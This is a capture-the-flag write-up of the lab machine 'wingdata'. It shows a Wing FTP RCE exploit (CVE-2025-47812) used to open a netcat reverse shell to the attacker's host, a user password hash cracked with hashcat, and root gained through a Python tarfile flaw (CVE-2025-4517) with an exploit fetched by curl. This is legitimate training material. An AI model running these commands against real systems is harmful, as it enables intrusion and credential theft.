![](Assets/Pasted%20image%2020260521174726.png)

First we make a ping to see we have connection.

```bash
ping -c 4 10.129.244.106
PING 10.129.244.106 (10.129.244.106) 56(84) bytes of data.
64 bytes from 10.129.244.106: icmp_seq=1 ttl=63 time=79.9 ms
64 bytes from 10.129.244.106: icmp_seq=2 ttl=63 time=99.4 ms
64 bytes from 10.129.244.106: icmp_seq=3 ttl=63 time=98.8 ms
64 bytes from 10.129.244.106: icmp_seq=4 ttl=63 time=94.1 ms

--- 10.129.244.106 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
```

# Reconnaissance

We executed a comprehensive port scan with Nmap to discover exposed services:

```bash
sudo nmap -p- --min-rate 5000 -sS -sV -sC 10.129.244.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 17:51 -0600
Nmap scan report for 10.129.244.106
Host is up (0.097s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The domain `wingdata.htb` was added to the local `/etc/hosts` file to allow DNS resolution and access to the web application.

# Initial Access

![](Assets/Pasted%20image%2020260521175634.png)

Client Portal.

![](Assets/Pasted%20image%2020260521180824.png)

So lets found one vulnerabilitie for the version [**CVE-2025-47812**](https://github.com/4m3rr0r/CVE-2025-47812-poc/blob/main/CVE-2025-47812.py).

**Description:** The problem lies in how the server processes the login through the /loginok.html endpoint. The developers made a classic mistake: they didn't properly sanitize the "Null Bytes".

So we use the exploit and we can see this:

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c ls -v

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls' and username: 'anonymous'
[+] UID extracted: 50dd9514b063da7f0bdaa5bcb09d5f47f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 50dd9514b063da7f0bdaa5bcb09d5f47f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
----------------------
```

So lets try a revershell

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2 with the exploit
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc <IP_Attack> 4444 -e /bin/sh" -v

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc 10.10.14.214 4444 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: 22aad4fdc7d77b96872bcb8212b2d519f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 22aad4fdc7d77b96872bcb8212b2d519f528764d624db129b32c21fbca0cb8d6
```

**Result:** Connection successfully received. We gained access as the `wingftp` service account. The interactive console (TTY) was stabilized using Python:

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.2.72 40818
id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
python3 -c 'import pty;pty.spawn("/bin/bash")'
wingftp@wingdata:/opt/wftpserver$ 
```

# Post Exploit

So we investigate and found some interesting like a folder `Data`, we can check and found all the xml of the users.

```bash
wingftp@wingdata:/opt/wftpserver$ ls
ls
Data	    pid-wftpserver.pid  version.txt  wftp_default_ssh.key
License.txt  README		webadmin     wftp_default_ssl.crt
Log	    session		webclient    wftp_default_ssl.key
lua	    session_admin	wftpconsole  wftpserver
wingftp@wingdata:/opt/wftpserver$ cd Data
cd Data
wingftp@wingdata:/opt/wftpserver/Data$ ls
ls
1  _ADMINISTRATOR  bookmark_db	settings.xml  ssh_host_ecdsa_key  ssh_host_key
wingftp@wingdata:/opt/wftpserver/Data$ ls 1
ls 1
groups	portlistener.xml  settings.xml	users
wingftp@wingdata:/opt/wftpserver/Data$ ls 1/users
ls 1/users
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

So lets check the `wacky.xml` and we can found the password: `<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>`

We identified the hash format (SHA256) and utilized `hashcat` along with the `rockyou.txt` wordlist to crack it:

```bash
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca::WingFTP' > pass.txt

hashcat -m 1410 pass.txt rockyou.txt
```

**Cracked Credential:** `wacky : !#7Blushing^*Bride5`

**Result:** We logged in via SSH using `wacky`'s credentials and captured the user flag

```bash
ssh wacky@wingdata.htb
wacky@wingdata.htb's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 21 21:28:37 2026 from 10.10.14.214
wacky@wingdata:~$
```

## Root Escalation

so first make this comand to see what we execute `sudo -l`

```bash
wacky@wingdata:/$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

We see this line `tar.extractall(path=staging_dir, filter="data")` and check the version of python 

```bash
wacky@wingdata:/opt/backup_clients/backups$ python3 --version
Python 3.12.3
```

we can found in google some CVE

![](Assets/Pasted%20image%2020260521220051.png)

So lets found a exploit like [CVE-2025-4517](https://github.com/advisories/GHSA-6r6c-684h-9j7p "CVE-2025-4517"), first go to `/tmp` 

```bash
#Terminal 1
python3 -m http.server 8080

#Terminal machine
wacky@wingdata:/tmp$ curl http://10.10.14.214:8080/exploit.py -o explot.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6973  100  6973    0     0  43277      0 --:--:-- --:--:-- --:--:-- 43310
wacky@wingdata:/tmp$ python3 explot.py 
...
root@wingdata:/tmp# 

```

Then you can read the other flag